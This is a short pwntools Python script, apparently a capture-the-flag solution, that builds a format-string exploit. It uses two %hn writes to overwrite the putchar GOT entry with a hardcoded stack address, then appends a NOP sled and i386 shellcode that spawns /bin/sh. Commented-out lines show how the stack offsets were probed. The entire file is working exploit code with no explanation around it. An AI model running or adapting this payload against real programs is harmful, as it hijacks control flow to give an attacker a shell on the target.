#!/usr/bin/python

from pwn import *

putchar_got = 0x804a014
shell = 0xffffcd55

payload = ""
payload += p32(putchar_got)
payload += p32(putchar_got + 0x2)
#payload += "%x" * 2
payload += "%52600x"
#payload += "%x"
payload += "%4$hn"
#payload += "%x" * 4
payload += "%12927x"
payload += "%5$hn"

#payload += "%x." * 3
#payload += "%65518x"
#payload += "%hn"

#payload = "AAAABBBB.%x.%x.%x.%x.%x"

shellcode = asm(shellcraft.i386.linux.sh(), arch='x86', os='linux')

payload += '\x90' * 10

payload += shellcode

print payload
